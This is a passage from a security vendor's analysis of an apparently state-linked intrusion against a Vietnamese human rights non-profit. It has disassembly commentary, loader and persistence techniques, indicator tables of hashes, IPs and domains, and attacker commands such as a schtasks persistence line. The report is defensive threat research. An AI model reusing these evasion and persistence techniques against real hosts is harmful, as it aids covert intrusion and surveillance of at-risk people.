+configuration file.
+
+C:\ProgramData\adobe\ms- 8e2e9e7b93f4ed67377f7b9df9523c6 e or
+adobe.bin 95f1d7e768c3301db6c653948766ff4 Potentially encrypted shellcod
+
+c3 configuration file.
+
+Node addon file. This references
+SrvAdobeUpd which is the name of a
+
+C:\ProgramData\adobe\1lpiozkc.nod b31bfa8782cb691178081d6685d8429 service it tries to create and loads
+e a2a2787b1130c6620d3486b4c3e02d code from
+
+441 C:\Programdata\Adobe\ms-
+adobe.bin
+
+C:\Users\
+<REDACTED>\AppData\Roaming\Mic c7e2dbc3df04554daa19ef125bc07a
+rosoft\Installer\{02594FE8-1152-E41E- 6fa52b5ea0ba010f187a082dc9fc2e9 Likely encrypted shellcode run from
+A75E- 7ed malicious goopdate.dll.
+923494C7B453}\DropboxUpdate.bin
+
+C:\Users\ 47839789332aaf8861f7731bf2d3fbb5 Legitimate Dropbox related
+<REDACTED>\AppData\Roaming\Mic e0991ea0d0b457bb4c8c1784f76c73 executable used to load a malicious
+
+https://www.huntress.com/blog/advanced-persistent-threat-targeting-vietnamese-human-rights-defenders 26/73
+
+
+
+2024/8/30 14:37 Advanced Persistent Threat Targeting Vietnamese Human Rights Defenders | Huntress
+
+Location Hash (SHA256) Notes
+
+rosoft\Installer\{02594FE8-1152-E41E- dc goopdate.dll.
+A75E-
+923494C7B453}\DropboxUpdate.exe
+
+C:\Users\ Malicious DLL likely used to load
+<REDACTED>\AppData\Roaming\Mic c03cc808b64645455aba526be1ea0 DropboxUpdate.bin.
+rosoft\Installer\{02594FE8-1152-E41E- 18242fcd39278acbbf5ec3df544f9cf9
+A75E-923494C7B453}\goopdate.dll 595 Possibly Timestomped
+
+Timestamp of May 17 19:10:24 2011
+
+During analysis of host 1, it was found that the legitimate cachuri.dll set to run as a COM object would explicitly import and
+run code from iisutil2.dll. Although iisutil2.dll had almost identical information as a signed, valid copy of iisutil.dll,
+this had been patched to run different code, and was modified to increase the file size above 50MB. It’s believed this was
+done to evade a number of YARA rules which often have file size constraints, and to prevent submitting the file to online
+sandboxing tools, many which have a file size limit of 50MB. This modification caused notable differences in the NT Header,
+Optional Header, and most significantly the .text section.
+
+https://www.huntress.com/blog/advanced-persistent-threat-targeting-vietnamese-human-rights-defenders 27/73
+
+
+
+2024/8/30 14:37 Advanced Persistent Threat Targeting Vietnamese Human Rights Defenders | Huntress
+
+Figure 6: View of .text section of iisutil2.dll compared with a legitimate version
+
+https://www.huntress.com/blog/advanced-persistent-threat-targeting-vietnamese-human-rights-defenders 28/73
+
+
+
+2024/8/30 14:37 Advanced Persistent Threat Targeting Vietnamese Human Rights Defenders | Huntress
+
+The entry point of this DLL had also been modified to offset 0x00025FB0 (155568) which differed from the original entry point
+of 0x00027FB0 (163760). A brief analysis of this binary showed it pushed the return address to the stack and then ran a
+function at 0x1002711e.
+
+Figure 7: Disassembly: View of call to function at 0x1002711e
+
+This is significant because these operations, the entry point, and the address of the function to be run are all identical to the
+previously mentioned malware submitted to VirusTotal which is tied to APT32/OceanLotus. A closer inspection showed that
+this file was actually identical to the sample on VirusTotal tied to OceanLotus mentioned earlier, with the only difference being
+data appended to it so that its file size grew above 50MB.
+
+https://www.huntress.com/blog/advanced-persistent-threat-targeting-vietnamese-human-rights-defenders 29/73
+
+
+
+2024/8/30 14:37 Advanced Persistent Threat Targeting Vietnamese Human Rights Defenders | Huntress
+
+Figure 8: Comparison view of the newly found binary to a known binary from VirusTotal
+
+In contrast, the legitimate DLL would begin setting up necessary registers before having a branch condition depending on the
+arguments passed to the executable running the DLL.
+
+https://www.huntress.com/blog/advanced-persistent-threat-targeting-vietnamese-human-rights-defenders 30/73
+
+
+
+2024/8/30 14:37 Advanced Persistent Threat Targeting Vietnamese Human Rights Defenders | Huntress
+
+Figure 9: Disassembly of the legitimate iisutil2.dll binary 
+
+The malicious DLL would then search the Process Environment Block (PEB) for a PEB_LDR_DATA structure so that it can identify
+the InLoadOrderModuleList. This structure contains a list of DLLs in the order that they were loaded.
+
+https://www.huntress.com/blog/advanced-persistent-threat-targeting-vietnamese-human-rights-defenders 31/73
+
+
+
+2024/8/30 14:37 Advanced Persistent Threat Targeting Vietnamese Human Rights Defenders | Huntress
+
+Figure 10: Disassembly: Searching for the DllBase in one of the lists of loaded DLLs
+
+The code includes multiple jump operations, such as the one shown in Figure 10, which would never be taken, or would only be
+used to run a small amount of instructions, before returning to the original flow of execution.
+
+https://www.huntress.com/blog/advanced-persistent-threat-targeting-vietnamese-human-rights-defenders 32/73
+
+
+
+2024/8/30 14:37 Advanced Persistent Threat Targeting Vietnamese Human Rights Defenders | Huntress
+
+Figure 11: Disassembly: Getting the pointer to the buffer of the first module
+
+Interestingly, this malware contains a number of garbage op-codes and control flow obfuscation to throw off-static analysis
+and break disassembly. This overlaps with techniques known to be used by APT32/OceanLotus as previously reported by
+ESET.
+
+https://www.huntress.com/blog/advanced-persistent-threat-targeting-vietnamese-human-rights-defenders 33/73
+
+
+
+2024/8/30 14:37 Advanced Persistent Threat Targeting Vietnamese Human Rights Defenders | Huntress
+
+https://www.huntress.com/blog/advanced-persistent-threat-targeting-vietnamese-human-rights-defenders 34/73
+
+
+
+2024/8/30 14:37 Advanced Persistent Threat Targeting Vietnamese Human Rights Defenders | Huntress
+
+Figure 12: Disassembly: View of unused JMP and junk code
+
+https://www.huntress.com/blog/advanced-persistent-threat-targeting-vietnamese-human-rights-defenders 35/73
+
+
+
+2024/8/30 14:37 Advanced Persistent Threat Targeting Vietnamese Human Rights Defenders | Huntress
+
+Figure 13: Disassembly: View of Failure to Disassemble junk code and getting pointer to DLL export directory.
+
+This malware looks at the DLLs loaded and their exports so that it can dynamically resolve APIs used to facilitate decryption
+and injection of a payload into memory. This has significant overlap with malware reported by BlackBerry/Cylance called
+Steganography Loader #2.
+
+Analysis revealed that this DLL would ultimately read in iisexpressshim.sdb, decrypt it using an XOR key of 0xFF, and then
+decompress the data using the LZNT1 compression algorithm. The decrypted iisexpressshim.sdb file showed more
+instances of junk op-codes being present which would never be evaluated.
+
+https://www.huntress.com/blog/advanced-persistent-threat-targeting-vietnamese-human-rights-defenders 36/73
+
+
+
+2024/8/30 14:37 Advanced Persistent Threat Targeting Vietnamese Human Rights Defenders | Huntress
+
+https://www.huntress.com/blog/advanced-persistent-threat-targeting-vietnamese-human-rights-defenders 37/73
+
+
+
+2024/8/30 14:37 Advanced Persistent Threat Targeting Vietnamese Human Rights Defenders | Huntress
+
+Figure 14: Disassembly: View of more junk code from iisexpressshim.sdb
+
+The decrypted DLL in memory would then load logo.png, use a custom steganography routine, and then make a call to the
+Windows CryptDecrypt API to decrypt and load the final DLL into memory. The use of a custom steganography routine to hide
+malicious code in a seemingly benign PNG file, in addition to use of a XOR key and compression, has overlap with the
+previously mentioned Steganography Loader used by APT32/OceanLotus. It’s noted that there were a number of differences
+between this version of the Steganography Loader and the one previously reported which included use of LZNT1 instead of
+LZMA, and a hardcoded XOR key of 0xFF instead of it being retrieved from a file on disk.
+
+The malware also had significant overlap with a sample analyzed by a security researcher back in March of 2019, and it’s
+highly likely both malware samples are from the same malware family. At the time of investigation, the host had active
+connections to 185.198.57[.]184 and 185.43.220[.]188 on port 8888 from the DllHost process running the COM object
+backdoor. 
+
+Passive DNS information for the IP address 185.198.57[.]184 showed that domains mentioned in the security researcher’s
+blog from 2019 resolved to this IP address. This helps to validate that the malware described in their blog is the same malware
+found on this system 5 years later. It’s also worth mentioning that none of the domains appear to have lapsed or have been
+
+https://www.huntress.com/blog/advanced-persistent-threat-targeting-vietnamese-human-rights-defenders 38/73
+
+
+
+2024/8/30 14:37 Advanced Persistent Threat Targeting Vietnamese Human Rights Defenders | Huntress
+
+re-registered, and the domains were all originally registered in late 2017. This indicates that the below domains have likely
+been under control of the same threat actor for almost 7 years.
+
+cdn.arlialter[.]com - Domain originally registered: 2017-10-27
+
+fbcn.enantor[.]com - Domain originally registered: 2017-10-27
+
+ww1.erabend[.]com - Domain originally registered: 2017-10-27‍
+
+var.alieras[.]com - Domain originally registered: 2017-10-27
+
+The domains also appear to masquerade as legitimate domains, which is notable given APT32/OceanLotus has previously
+used this technique throughout their intrusions.
+
+Domain Legitimate Domain
+
+alieras[.]com alier[.]com
+
+enantor[.]com emantor[.]com
+
+erabend[.]com erbend[.]com
+
+The host was also found to have another four scheduled tasks which were masquerading as various services with identical
+descriptions. These tasks had a similar naming convention to previously seen scheduled tasks. In addition, a user run key also
+had a similar naming convention:
+
+Scheduled Task 1
+Task Path: Microsoft Compatibility Appraiser_{8BCC608C-CE2C-475E-85CB-AE0EC95EAC64}
+Description: Collects program telemetry information if opted-in to the Microsoft Customer Experience Improvement Program.
+
+https://www.huntress.com/blog/advanced-persistent-threat-targeting-vietnamese-human-rights-defenders 39/73
+
+
+
+2024/8/30 14:37 Advanced Persistent Threat Targeting Vietnamese Human Rights Defenders | Huntress
+
+COM Handler: {8BCC608C-CE2C-475E-85CB-AE0EC95EAC64}
+Task File Creation Date: 2020-01-14
+
+Scheduled Task 2
+Task Path: Microsoft\Windows\Active Directory Rights Management Services Client\AD RMS Rights Policy
+Template Management (Automated)_{2A918D97-CCFE-4BE6-AB0E-D56A2E3F503D}
+Description: Updates the AD RMS rights policy templates for the user. This job does not provide a credential prompt if
+authentication to the template distribution web service on the server fails. In this case, it fails silently.
+COM Handler: {2A918D97-CCFE-4BE6-AB0E-D56A2E3F503D}
+Task File Creation Date: 2019-08-13
+
+Scheduled Task 3
+Task Path: AD RMS Rights Policy Template Management (Automated)_{2A918D97-CCFE-4BE6-AB0E-
+D56A2E3F503D}
+Description: Updates the AD RMS rights policy templates for the user. This job does not provide a credential prompt if
+authentication to the template distribution web service on the server fails. In this case, it fails silently.
+COM Handler: {2A918D97-CCFE-4BE6-AB0E-D56A2E3F503D}
+Task File Creation Date: 2019-08-13
+
+Scheduled Task 4
+Task Path: Microsoft\Windows\Active Directory Rights Management Services Client\AD RMS Rights Policy
+Template Management (Automated)_{2A918D97-CCFE-4BE6-AB0E-D56A2E3F503D}
+Description: Updates the AD RMS rights policy templates for the user. This job does not provide a credential prompt if
+authentication to the template distribution web service on the server fails. In this case, it fails silently.
+COM Handler: {2A918D97-CCFE-4BE6-AB0E-D56A2E3F503D}
+Task File Creation Date: 2019-08-13
+
+https://www.huntress.com/blog/advanced-persistent-threat-targeting-vietnamese-human-rights-defenders 40/73
+
+
+
+2024/8/30 14:37 Advanced Persistent Threat Targeting Vietnamese Human Rights Defenders | Huntress
+
+Note: This scheduled task is identical to another scheduled task created except it has the control character 0x9d at the end
+of it.
+
+Run Key 1
+Registry Key: HKU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+Name: DropboxUpdate_{02594FE8-1152-E41E-A75E-923494C7B453}
+Path: c:\users\<REDACTED>\appdata\roaming\microsoft\installer\{02594fe8-1152-e41e-a75e-
+923494c7b453}\dropboxupdate.exe
+Command: C:\Users\<REDACTED>\AppData\Roaming\Microsoft\Installer\{02594FE8-1152-E41E-A75E-
+923494C7B453}\DropboxUpdate.exe /installsource taggedmi
+Binary Creation Date: 2019-11-14
+
+Examining host 1’s scheduled tasks found another two instances of the malicious COM backdoor registered. These would no
+longer run the malicious code hidden within logo.png as the required malicious iisutil2.dll had been removed from the
+system. It’s suspected that multiple variants of the backdoor were established on the system over time to help ensure access
+remained even if AV products picked up on some of the existing backdoors.
+
+Amongst the scheduled tasks was a DropboxUpdate task pointing to a legitimate executable. Although DropboxUpdate
+doesn’t directly import and use goopdate.dll, this is indirectly called and loaded by DropboxUpdate which is then used to
+load a malicious DropboxUpdate.bin file in the same directory as shown below in Figure 15.
+
+https://www.huntress.com/blog/advanced-persistent-threat-targeting-vietnamese-human-rights-defenders 41/73
+
+
+
+2024/8/30 14:37 Advanced Persistent Threat Targeting Vietnamese Human Rights Defenders | Huntress
+
+Figure 15: ProcMon view of process activity
+
+Analysis of process memory found multiple domains and C2 configuration details for this malware:
+
+https://www.huntress.com/blog/advanced-persistent-threat-targeting-vietnamese-human-rights-defenders 42/73
+
+
+
+2024/8/30 14:37 Advanced Persistent Threat Targeting Vietnamese Human Rights Defenders | Huntress
+
+Figure 16: View of DropboxUpdate.exe process’ memory
+
+These domains once again masqueraded as legitimate domains.
+
+Domain Legitimate Domain
+
+popfan[.]com Various
+
+https://www.huntress.com/blog/advanced-persistent-threat-targeting-vietnamese-human-rights-defenders 43/73
+
+
+
+2024/8/30 14:37 Advanced Persistent Threat Targeting Vietnamese Human Rights Defenders | Huntress
+
+Domain Legitimate Domain
+
+setalz[.]com setabz[.]com
+
+riceaub[.]com riceau[.]com
+
+eatherurg[.]com ethereum[.]org
+
+The malicious DLL goopdate.dll is more than 20MB in size and makes a check for a hardcoded GUID environment variable
+on the system. If it’s not present it will be set. This is done before setting memory permissions to RWX to allow injecting the
+.bin payload into memory.
+
+https://www.huntress.com/blog/advanced-persistent-threat-targeting-vietnamese-human-rights-defenders 44/73
+
+
+
+2024/8/30 14:37 Advanced Persistent Threat Targeting Vietnamese Human Rights Defenders | Huntress
+
+Figure 17: Disassembly: View of Injection of .bin payload
+
+Of note is that this DLL has a function at offset 0x0001010 which uses a hardcoded list of names in this injection routine.
+Specifically, it will take the last name in the array and concatenate it with all the other names which is then evaluated prior to
+injection.
+
+https://www.huntress.com/blog/advanced-persistent-threat-targeting-vietnamese-human-rights-defenders 45/73
+
+
+
+2024/8/30 14:37 Advanced Persistent Threat Targeting Vietnamese Human Rights Defenders | Huntress
+
+Figure 18: Disassembly: View of hardcoded list of names in injection routine
+
+No specific overlaps were seen with previously reported malicious goopdate.dll files used by APT32/OceanLotus. Despite
+this Facebook, Cybereason, and Volexity have all previously reported the use of APT32/OceanLotus using a malicious
+goopdate.dll which was loaded into a benign executable. It’s worth noting that this technique and DLL name is also used
+amongst other threat actors.
+
+Examining the JAR files adobe.jar and msadobe.jar found these to be simple loaders that would run specific embedded
+DLLs into memory from a main class called UpdateData.
+
+Figure 19: View of embedded DLL mi54giwp.dll
+
+https://www.huntress.com/blog/advanced-persistent-threat-targeting-vietnamese-human-rights-defenders 46/73
+
+
+
+2024/8/30 14:37 Advanced Persistent Threat Targeting Vietnamese Human Rights Defenders | Huntress
+
+Figure 20: View of embedded DLL zfhqq01v.dll in decompiled msadobe.jar
+
+https://www.huntress.com/blog/advanced-persistent-threat-targeting-vietnamese-human-rights-defenders 47/73
+
+
+
+2024/8/30 14:37 Advanced Persistent Threat Targeting Vietnamese Human Rights Defenders | Huntress
+
+Figure 21: View of code of UpdateData
+
+Looking at the DLL mi54giwp.dll found it would create a Mutex with the value okSSjZzAlnNOlQaGoDWx prior to targeting a
+.bin file located within a directory hardcoded into the DLL. This highlights the malware had been created specifically to
+target the system it was run on. 
+
+Figure 22: Disassembly of mi54giwp.dll, which shows creation of Mutex
+
+https://www.huntress.com/blog/advanced-persistent-threat-targeting-vietnamese-human-rights-defenders 48/73
+
+
+
+2024/8/30 14:37 Advanced Persistent Threat Targeting Vietnamese Human Rights Defenders | Huntress
+
+Figure 23: View of hardcoded file paths by mi54giwp.dll
+
+Similar behavior was found on the the DLL zfhqq01v.dll which creates a Mutex with the value sbvjJpGLbbmnHNfWEetm
+prior to targeting a .bin file located within a different user account directory hardcoded into the DLL.
+
+https://www.huntress.com/blog/advanced-persistent-threat-targeting-vietnamese-human-rights-defenders 49/73
+
+
+
+2024/8/30 14:37 Advanced Persistent Threat Targeting Vietnamese Human Rights Defenders | Huntress
+
+Figure 24: Disassembly of zfhqq01v.dll, which shows Mutex creation
+
+https://www.huntress.com/blog/advanced-persistent-threat-targeting-vietnamese-human-rights-defenders 50/73
+
+
+
+2024/8/30 14:37 Advanced Persistent Threat Targeting Vietnamese Human Rights Defenders | Huntress
+
+Whilst examining host 1 it was found that persistence had previously been set up to run a suspicious executable from a user
+run key. This executable was quarantined by Windows Defender.
+
+Run Key 2
+Registry Key: HKU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+Name: Trusted Platform Console
+Command: C:\Users\<REDACTED>\AppData\Local\TPM Console\TpmInit.exe
+
+Of note is that the “TPM Console” directory had three files in it with varying modification timestamps which are of interest
+when it comes to timelining this incident.
+
+File Modification Timestamp
+
+TpmInit.db <REDACTED>
+
+TpmInit.mdb 2017-02-07 23:54:29
+
+TpmInit.mdf 2017-02-07 23:54:29
+
+Analysis of the quarantined TpmInit.exe found that this was a modified version of a legitimate TpmInit executable. This
+executable when initially run will create two files TpmInit.mdb and TpmInit.mdf on disk if they’re not present before
+terminating, at which point these files will no longer be modified.
+
+https://www.huntress.com/blog/advanced-persistent-threat-targeting-vietnamese-human-rights-defenders 51/73
+
+
+
+2024/8/30 14:37 Advanced Persistent Threat Targeting Vietnamese Human Rights Defenders | Huntress
+
+Figure 25: Analysis of TpmInit.exe, showing creation of TpmInit.mdf and TpmInit.mdb
+
+https://www.huntress.com/blog/advanced-persistent-threat-targeting-vietnamese-human-rights-defenders 52/73
+
+
+
+2024/8/30 14:37 Advanced Persistent Threat Targeting Vietnamese Human Rights Defenders | Huntress
+
+Figure 26: Differences between TpmInit.mdf and TpmInit.mdb
+
+Although it’s unknown whether this executable was related to the same intrusion, modification timestamps indicate this
+malware may have been present and running on the host since 2017. If both TPMInit.mdb and TPMInit.mdf are present
+when the executable is run, TpmInit.db (a DLL) is dropped from TpmInit.exe and run using rundll32.exe after first
+injecting into another rundll32 process. This file will have its modification timestamp change every time the executable is run,
+indicating a potential first and last time this malware was executed on the system.
+
+To execute TpmInit.db, the malware leverages the legitimate rundll32 application to run an exported function called
+‘TpmVCardCreate’. It’s worth noting that the exports in this DLL are named after a subset of exports found in a legitimate
+tpmvsc.dll usually found on Windows.
+
+https://www.huntress.com/blog/advanced-persistent-threat-targeting-vietnamese-human-rights-defenders 53/73
+
+
+
+2024/8/30 14:37 Advanced Persistent Threat Targeting Vietnamese Human Rights Defenders | Huntress
+
+Figure 27: Export Table of TpmInit.db, showing the TpmVCardCreate function
+
+After execution, this would get a handle to kernel32.dll to get the address of modules to be used and check to see if
+Kaspersky AV was running on the system (avp.exe) and avg (avghookx.dll) as seen in Figure 28.
+
+https://www.huntress.com/blog/advanced-persistent-threat-targeting-vietnamese-human-rights-defenders 54/73
+
+
+
+2024/8/30 14:37 Advanced Persistent Threat Targeting Vietnamese Human Rights Defenders | Huntress
+
+Figure 28: Analysis showing check for Kaspersky AV
+
+Later on, this opens a handle to explorer.exe, creates a new thread, and injects the contents of a file on disk at C:\Users\
+<username>\AppData\Roaming\Microsoft\MicrosoftEdge\container.dat into memory. At the time of investigation,
+this file wasn’t found on disk.
+
+https://www.huntress.com/blog/advanced-persistent-threat-targeting-vietnamese-human-rights-defenders 55/73
+
+
+
+2024/8/30 14:37 Advanced Persistent Threat Targeting Vietnamese Human Rights Defenders | Huntress
+
+Figure 29: Analysis showing check for container.dat
+
+Analysis of Infrastructure
+Examining the two suspected Cobalt Strike Team Server IP addresses found that both were signed with Let’s Encrypt
+certificates and were sitting behind a Cloudflare Load Balancer. Of interest is that the servers would present a 404 Not
+
+https://www.huntress.com/blog/advanced-persistent-threat-targeting-vietnamese-human-rights-defenders 56/73
+
+
+
+2024/8/30 14:37 Advanced Persistent Threat Targeting Vietnamese Human Rights Defenders | Huntress
+
+Found message with a Content-Length of 0 whenever a GET request with a URI containing a ‘/’ was sent. The servers would
+also present a 200 response with a Content-Length of 0, and the allowed methods OPTIONS, GET, HEAD, POST whenever an
+OPTIONS request was sent. This is significant because the same behavior is expected when you’re interacting with a Cobalt
+Strike Team Server as previously reported by Palo Alto Networks.
+
+The combination of specific response headers and Cloudflare Load Balancer lead to a unique service banner which was seen
+across both of the suspected Cobalt Strike C2 IP addresses through a Censys search, seen in Figure 30.
+
+Figure 30: Service banner seen on Censys for 51.81.29[.]44
+https://www.huntress.com/blog/advanced-persistent-threat-targeting-vietnamese-human-rights-defenders 57/73
+
+
+
+2024/8/30 14:37 Advanced Persistent Threat Targeting Vietnamese Human Rights Defenders | Huntress
+
+Figure 31: Service banner seen on Censys for 5.230.35[.]192
+
+A search for this banner found only seven hosts making this a fairly unique fingerprint. Looking for only hosts that were
+identified by both a name and an IP address found three unique IP addresses and domains, of which only one hadn’t been
+seen in this intrusion.
+
+https://www.huntress.com/blog/advanced-persistent-threat-targeting-vietnamese-human-rights-defenders 58/73
+
+
+
+2024/8/30 14:37 Advanced Persistent Threat Targeting Vietnamese Human Rights Defenders | Huntress
+
+https://www.huntress.com/blog/advanced-persistent-threat-targeting-vietnamese-human-rights-defenders 59/73
+
+
+
+2024/8/30 14:37 Advanced Persistent Threat Targeting Vietnamese Human Rights Defenders | Huntress
+
+Figure 32: Analysis of the banner hash
+
+Interestingly, all of these IP addresses had domain names which looked to be masquerading as legitimate websites or
+software, and none of the ASNs or service providers overlapped.
+
+Targeting and Attribution
+It’s long been reported that journalists, bloggers, dissidents, and Vietnamese human rights advocates have been targeted by
+malware and tactics consistent with APT32/OceanLotus operations dating back to at least 2013. This has been reported by
+companies such as Google, the Electronic Frontier Foundation, Amnesty International, and a large number of other security
+vendors. During our investigation a number of overlaps were found between known techniques used by APT32/OceanLotus,
+the target verticals and interests of this threat actor, and what was found in this intrusion:
+
+The target was a non-profit supporting Vietnamese human rights
+
+The malware in question used a malicious DLL which was loaded by an IIS Express DLL named iisutil.dll. This has
+overlap with a YARA rule created by Nextron Systems that points towards the threat actor APT32/OceanLotus.
+
+The malicious DLL used in this intrusion used a modified version of iisutil with the entry point 0x00025FB0 (155568)
+and a function at 0x1002711e. All code in the malware is identical to malware uploaded to VirusTotal noted to be
+associated with APT32/OceanLotus besides extra padding appended to it.
+
+Port 8888 and 8531 were used within the malware C2 configuration. The COM object backdoor aligns with public
+reporting by a security researcher from 2019 where the final payload contained eight possible C2 server addresses
+with identical port numbers. 
+
+https://www.huntress.com/blog/advanced-persistent-threat-targeting-vietnamese-human-rights-defenders 60/73
+
+
+
+2024/8/30 14:37 Advanced Persistent Threat Targeting Vietnamese Human Rights Defenders | Huntress
+
+The use of hardcoded C2 addresses in a DLL resource has known overlap with malware used by APT32/OceanLotus as
+reported by BlackBerry/Cylance.
+
+The use of COM objects and Steganography using PNG files is a known technique reported to be used by
+APT32/OceanLotus as reported by BlackBerry/Cylance.
+
+Alternate Data Streams with the name log.txt were appended to a PowerShell script and loaded by wscript
+through a scheduled task. This has a naming convention similar to a publicly reported campaign attributed to
+APT32/OceanLotus ‘Operation Cobalt Kitty’ by Cybereason.
+
+Cobalt Strike is suspected to have been used by the threat actor by loading a malicious DLL into a legitimate
+executable, a known technique used by APT32/OceanLotus.
+
+Facebook, Cybereason, and Volexity have all reported the use of APT32/OceanLotus using a malicious goopdate.dll
+loading into a benign executable.
+
+APT32/OceanLotus has been known to use unique CLSIDs, Binary Padding, compression, and Scheduled Tasks in their
+intrusions as reported by ESET. The naming conventions used in their malware is also similar.
+
+APT32/OceanLotus has been known to use lots of unique domains and infrastructure with minimal overlap to help
+remain in environments for long periods of time which aligns with what we’ve seen here.
+
+APT32/OceanLotus has been known to incorporate Java-based malware into their operations.
+
+APT32/OceanLotus has previously used garbage op-codes in their malware to throw off analysis, and control flow
+obfuscation as reported by ESET.
+
+APT32/OceanLotus has previously used the McAfee OEM module to sideload malicious dll’s as reported by ESET.
+
+APT32/Oceanlotus has previously used Cobalt Strike servers behind Cloudflare as reported by Cybereason and
+Volexity
+
+APT32/OceanLotus has previously used the Apple Software Update binary to sideload malicious dll’s as reported by
+Recorded Future.
+
+APT32/OceanLotus has previously heavily used Let’s Encrypt TLS certificates in its infrastructure as reported by Volexity.
+
+https://www.huntress.com/blog/advanced-persistent-threat-targeting-vietnamese-human-rights-defenders 61/73
+
+
+
+2024/8/30 14:37 Advanced Persistent Threat Targeting Vietnamese Human Rights Defenders | Huntress
+
+Indicators of Compromise
+Indicator Type Details
+
+300ef93872cc574024f2402b5b899c8
+msadobe.jar SHA256 34908a0c7da70477a3aeeaee2e458
+
+a891
+
+b31bfa8782cb691178081d6685d8429
+1lpiozkc.node SHA256 a2a2787b1130c6620d3486b4c3e02d
+
+441
+
+8e2e9e7b93f4ed67377f7b9df9523c6
+ms-adobe.bin SHA256 95f1d7e768c3301db6c653948766ff4
+
+c3
+
+1bd17369848c297fb30e424e613c10c
+1.bat SHA256 cae44aa0556b9c88f6bf51d84d2cbf
+
+327
+
+6cf19d0582c6c31b9e198cd0a3d714b
+1.txt SHA256 397484a3b16518981d935af9fd6cdb2
+
+eb
+
+f8773628cdeb821bd7a1c7235bb855
+logo.png SHA256 e9b41aa808fed1510418a7461f7b82fd
+
+6c
+
+c03cc808b64645455aba526be1ea0
+goopdate.dll SHA256 18242fcd39278acbbf5ec3df544f9cf9
+
+595
+
+https://www.huntress.com/blog/advanced-persistent-threat-targeting-vietnamese-human-rights-defenders 62/73
+
+
+
+2024/8/30 14:37 Advanced Persistent Threat Targeting Vietnamese Human Rights Defenders | Huntress
+
+Indicator Type Details
+
+aa69c6c22f1931d90032a2d825dbee
+logo.png SHA256 266954fac33f16c6f9ce7714e012404e
+
+c1
+
+a6072e7b0fafb5f09fd02c37328091a
+adobe.png SHA256 bfede86c7c8cb802852985a37147bfa
+
+19
+
+09f53e68e55a38c3e989841f59a9c4
+iisexpressshim.sdb SHA256 738c34c308e569d23315fd0e2341195
+
+856
+
+aa5ff1126a869b8b5a0aa72f609215d
+cachuri.dll SHA256 8e3b73e833c60e4576f2d3583cc5af
+
+4f4
+
+c7e2dbc3df04554daa19ef125bc07a
+DropboxUpdate.bin SHA256 6fa52b5ea0ba010f187a082dc9fc2e9
+
+7ed
+
+a217fe01b34479c71d3a7a524cb3857
+iisexpressshim.sdb SHA256 809e575cd223d2dd6666cdd47bd28
+
+6cd6
+
+efc373b0cda3f426d25085938cd02b7
+adobe.jar SHA256 344098e773037a70404c6028c76cc1
+
+6fc
+
+https://www.huntress.com/blog/advanced-persistent-threat-targeting-vietnamese-human-rights-defenders 63/73
+
+
+
+2024/8/30 14:37 Advanced Persistent Threat Targeting Vietnamese Human Rights Defenders | Huntress
+
+Indicator Type Details
+
+6c08a004a915ade561aee4a4bec7d
+MSSharePoint.vbs SHA256 c588c185bd945621ec8468575a399a
+
+b81f4
+
+ea8a00813853038820ba50360c5c1
+cloud.bat SHA256 d57a47d72237e3f76c581d316f0f1c6e
+
+85f
+
+82e94417a4c4a6a0be843ddc60f5e
+logo.png SHA256 595733ed99bbfed6ac508a5ac6d4d
+
+d31813
+
+47af8a33aac2e70ab6491a4c0a94fd
+iisutil2.dll SHA256 7840ff8014ad43b441d01bfaf9bf6c4
+
+ab7
+
+a166751b82eac59a44fd54cf74295e7
+SoftwareUpdate.exe SHA256 1e7e95474fc038fc8cca069da051585
+
+86
+
+Wdiservicehost.exe 3124fcb79da0bdf9d0d1995e37b06f7
+(renamed mcoemcpy.exe) SHA256 929d83c1c4b60e38c104743be71170
+
+efe
+
+29863f612d2da283148cb327a1d57d0
+TpmInit.exe SHA256 a658d75c8e65f9ef4e5b19835855e9
+
+81e
+
+51.81.29[.]44 IP DNS: kpi.adcconnect[.]me
+ASN: OVH SAS
+
+https://www.huntress.com/blog/advanced-persistent-threat-targeting-vietnamese-human-rights-defenders 64/73
+
+
+
+2024/8/30 14:37 Advanced Persistent Threat Targeting Vietnamese Human Rights Defenders | Huntress
+
+Indicator Type Details
+
+DNS: dupbleanalytics[.]net
+DNS: get.dupbleanalytics[.]net
+NS: 3-get.njalla[.]fo
+
+5.230.35[.]192 IP NS: 2-can.njalla[.]in
+NS: 1-you.njalla[.]no
+SOA: you.can-get-no[.]info
+ASN: GHOSTnet GmbH
+
+DNS: fbcn.enantor[.]com
+DNS: cdn.arlialter[.]com
+
+185.198.57[.]184 IP DNS: ww1.erabend[.]com
+DNS: var.alieras[.]com
+ASN: Host Sailor Ltd
+
+185.43.220[.]188 IP ASN: WIBO Baltic UAB
+
+193.107.109[.]148 IP DNS: base.msteamsapi[.]com
+
+DNS: cds55[.]lax8[.]setalz[.]com
+46.183.223[.]79 IP DNS: hx-in-f211[.]popfan[.]org
+
+DNS: adobe[.]riceaub[.]com
+
+176.103.63[.]48 IP DNS: priv[.]manuelleake[.]com
+DNS: blank[.]eatherurg[.]com
+
+hx-in-f211[.]popfan[.]org Domain A: 46.183.223[.]79
+
+cds55[.]lax8[.]setalz[.]com Domain A: 46.183.223[.]79
+
+adobe[.]riceaub[.]com Domain A: 46.183.223[.]79
+
+https://www.huntress.com/blog/advanced-persistent-threat-targeting-vietnamese-human-rights-defenders 65/73
+
+
+
+2024/8/30 14:37 Advanced Persistent Threat Targeting Vietnamese Human Rights Defenders | Huntress
+
+Indicator Type Details
+
+priv[.]manuelleake[.]com Domain A: 176.103.63[.]48
+
+blank[.]eatherurg[.]com Domain A: 176.103.63[.]48
+
+cdn.arlialter[.]com Domain 185.198.57[.]184
+
+fbcn.enantor[.]com Domain 185.198.57[.]184
+
+ww1.erabend[.]com Domain 185.198.57[.]184
+
+var.alieras[.]com Domain 185.198.57[.]184
+
+MITRE ATT&CK Mapping
+Indicator MITRE ATT&CK Note
+
+whoami /priv T1033: System Owner/User Discovery
+
+schtasks /create /sc minute /mo 300
+/tn Handler{60396-307392-03497-
+03790-3702046} /tr "C:\Users\ T1053.005: Scheduled Task/Job:
+<REDACTED>\AppData\Roaming\Mic Scheduled Task
+rosoft\Windows\CloudStore\cloud.ba
+t" /f
+
+https://www.huntress.com/blog/advanced-persistent-threat-targeting-vietnamese-human-rights-defenders 66/73
+
+
+
+2024/8/30 14:37 Advanced Persistent Threat Targeting Vietnamese Human Rights Defenders | Huntress
+
+Indicator MITRE ATT&CK Note
+
+T1059.003: Command and Scripting
+Interpreter: Windows Command Shell 1.bat was being launched via
+
